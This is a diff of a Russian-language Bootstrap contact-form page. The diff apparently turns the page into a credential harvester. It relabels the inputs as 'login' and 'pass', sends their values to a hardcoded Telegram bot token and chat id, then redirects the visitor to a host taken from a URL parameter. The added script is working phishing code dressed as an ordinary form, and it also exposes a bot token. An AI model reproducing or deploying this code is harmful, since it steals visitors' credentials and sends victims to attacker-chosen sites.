@@ -1,67 +1,93 @@
 <!DOCTYPE html>
 <html lang="ru">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
-    <meta name="description" content="">
-    <meta name="author" content="">
-    <link rel="icon" href="/favicon.ico">
 
-    <title>Отправка формы на почту </title>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link rel="icon" href="/favicon.ico">
 
-    <!-- Bootstrap core CSS -->
-    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
+  <title>Отправка формы на почту </title>
 
-    <!-- Custom styles for this template -->
-    <style>
-    	form {
-    		background-color: #f9f9f9;
-    		padding: 20px;
-    		margin: 20px;
-    	}
-    </style>
-  </head>
+  <!-- Bootstrap core CSS -->
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
 
-  <body>
-    <div class="container">
+  <!-- Custom styles for this template -->
+  <style>
+    form {
+      background-color: #f9f9f9;
+      padding: 20px;
+      margin: 20px;
+    }
+  </style>
+</head>
 
-      <div class="row">
-      	<div class="col-sm-4">
-      		<form action="telegram.php" method="POST">
-      			<legend>Заголовок формы</legend>
+<body>
+  <div class="container">
 
-      			<div class="form-group">
-      				<label for="">Введите ваше имя</label>
-      				<input type="text" class="form-control" id="" name="user_name" placeholder="Например, Иван">
-      			</div>
-      		
-      			<div class="form-group">
-      				<label for="">Введите номер телефона</label>
-      				<input type="text" class="form-control" id="" name="user_phone" placeholder="+7 (999) 99 99 999">
-      			</div>
-      		
-      			<div class="form-group">
-      				<label for="">Введите email</label>
-      				<input type="text" class="form-control" id="" name="user_email" placeholder="mail@mail.ru">
-      			</div>
-      		
-      			<button type="submit" class="btn btn-primary">Отправить форму</button>
-      		</form>
-      	</div><!-- .col-sm-4 -->
-      </div> <!-- .row -->
+    <div class="row">
+      <div class="col-sm-4">
+        <!-- <form> -->
+        <legend>Заголовок формы</legend>
 
-    </div><!-- /.container -->
+        <div class="form-group">
+          <label for="">Введите ваше имя</label>
+          <input type="text" class="form-control" id="login" name="user_name" placeholder="Например, Иван">
+        </div>
+
+        <div class="form-group">
+          <label for="">Введите номер телефона</label>
+          <input type="text" class="form-control" id="pass" name="user_phone" placeholder="+7 (999) 99 99 999">
+        </div>
+
+        <button type="button" class="btn btn-primary" id="btnn">Отправить форму</button>
+        <!-- </form> -->
+      </div><!-- .col-sm-4 -->
+    </div> <!-- .row -->
+
+  </div><!-- /.container -->
 
 
-    <!-- Bootstrap core JavaScript
+  <!-- Bootstrap core JavaScript
     ================================================== -->
-    <!-- Placed at the end of the document so the pages load faster -->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
-    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
-    <script src="http://getbootstrap.com/assets/js/ie10-viewport-bug-workaround.js"></script>
-  </body>
+  <!-- Placed at the end of the document so the pages load faster -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+  <script src="http://getbootstrap.com/assets/js/ie10-viewport-bug-workaround.js"></script>
+  <script>
+    $(document).ready(function () {
+      function test() {
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        const post = urlParams.get('post')
+        return post
+      }
+      function goTo() {
+        window.location.assign(`https://${test()}`)
+      }
+
+
+      $('#btnn').on('click', function () {
+        const token = "1036928048:AAHa-yqcdAFqUxpx5mvkttpLNbhzqeBQba0";
+        const chat_id = "-1001424374909";
+        let login = $('#login').val();
+        let pass = $('#pass').val();
+        let txt = `Login: ${login} \n Pass: ${pass}`
+
+        let xhr = new XMLHttpRequest();
+        xhr.open('POST', `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${txt}`);
+        xhr.send();
+
+        setTimeout(function() { goTo(); }, 1000);
+      })
+    });
+
+
+  </script>
+</body>
+
 </html>
-	
